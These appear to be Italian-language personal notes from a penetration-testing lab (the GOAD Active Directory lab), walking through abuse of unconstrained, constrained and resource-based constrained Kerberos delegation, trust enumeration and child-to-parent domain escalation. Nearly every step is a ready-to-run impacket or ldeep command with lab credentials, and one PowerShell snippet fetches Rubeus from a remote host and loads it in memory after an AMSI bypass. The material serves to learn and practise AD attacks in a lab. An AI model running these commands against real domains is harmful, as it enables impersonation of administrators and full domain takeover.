### **UNCOSTRAINED DELEGATIONS**

Per trovarle all'interno di BloodHound puoi selezionare la query precompilata o lanciare la seguente
```
MATCH (c {unconstraineddelegation:true}) return c
```
![[Pasted image 20230911104551.png]]
Per exploitarla accediamo al pc con uno degli account ottenuti precedentemente
```bash
xfreerdp /d:north.sevenkingdoms.local /u:eddard.stark /p:'FightP3aceAndHonor!' /v:192.168.56.11 /cert-ignore
```
e bypassiamo l'amsi come abbiamo già fatto
Poi avviamo Rubeus sulla macchina
```Powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data);
[Rubeus.Program]::MainString("triage");
```
![[Pasted image 20230911105711.png]]
[GOAD - part 10 - Delegations | Mayfly (mayfly277.github.io)](https://mayfly277.github.io/posts/GOADv2-pwning-part10/)
Il resto dell'attacco non posso farlo perchè non mi funziona rubeus
### **CONSTRAINED DELEGATION**
Puoi trovare tutte le constrained delegation con impacket
```bash
impacket-findDelegation NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local
```
![[Pasted image 20230911111407.png]]
*Con protocol transition*

Per exploitarlo isogna prima chiedere un TGT per l'utente e poi esguire S4U2Self seguito d S4U2Proxy per impersonare un admin
```bash
impacket-getST -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```
![[Pasted image 20230911111655.png]]
Puoi loggare dopo con wmixec

### **Resource Based Constrained Delegation**
Può essere abusato modificando msDS-AllowedToActOnBehalfOfOtherIdentity.
Per esempio può essere effettuato quando hai genericAll o genericWrite ACl su un computer
![[Pasted image 20230911114240.png]]
Creiamo un computer X
```bash
impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'
```
aggiungo la delegation sul target da X (rbcd$)
```bash
impacket-rbcd -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
```
Ora che abbiamo la delegazione possiamo fare S4U
```bash
impacket-getST -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'
```
![[Pasted image 20230911115059.png]]
ed accedere con wmiexec
### **ACL**
### **TRUST ENUM**
Incominciamo enumerando i trust:
```bash
ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.10 trusts
ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.12 trusts
```
![[Pasted image 20230911121034.png]]
- The sevenkingdoms to essos trust link è `FOREST_TRANSITIVE | TREAT_AS_EXTERNAL` per via della Sid history abilitata
- The essos to sevenkingdoms trust link è solo `FOREST_TRANSITIVE`

### **RaiseMeUp - impacker raiseChild**
Per scalare da child a parent
```bash
impacket-raiseChild north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'
```
